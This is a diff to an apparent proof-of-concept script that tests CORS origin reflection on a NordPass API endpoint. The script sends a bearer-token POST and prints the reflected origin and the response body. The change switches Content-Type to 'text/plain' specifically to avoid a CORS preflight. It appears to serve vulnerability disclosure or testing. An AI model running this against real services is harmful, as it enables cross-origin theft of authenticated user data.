@@ -45,9 +45,8 @@ async function runPoC() {
     const response = await fetch('https://api.nordpass.com/v1/notification/tokens', {
       method: 'POST',
       headers: {
-        'Content-Type': 'application/json',
+        'Content-Type': 'text/plain',  // ← avoids preflight
         'Authorization': 'Bearer ' + token,
-        'Nordpass-User-Agent': 'NordPass webvault (7.13.5) Windows',
       },
       body: JSON.stringify({
         app_user_uid: uid,
@@ -56,22 +55,18 @@ async function runPoC() {
       })
     });
 
-    // Capture CORS response headers
     const acao = response.headers.get('access-control-allow-origin');
     const body = await response.json();
 
     out.innerHTML =
-      '<span class="success">✓ Request succeeded — Origin was reflected!</span>\n\n' +
+      '<span class="success">✓ Origin reflected!</span>\n\n' +
       'Access-Control-Allow-Origin: ' + acao + '\n\n' +
-      'Response body:\n' +
       JSON.stringify(body, null, 2);
 
   } catch (err) {
     out.innerHTML =
-      '<span class="error">✗ Request blocked by browser CORS policy.</span>\n\n' +
-      'Error: ' + err.message + '\n\n' +
-      'This means the server did NOT reflect your origin.\n' +
-      'Check DevTools → Console for details.';
+      '<span class="error">✗ ' + err.message + '</span>\n\n' +
+      'Open DevTools → Console for details.';
   }
 }
 </script>
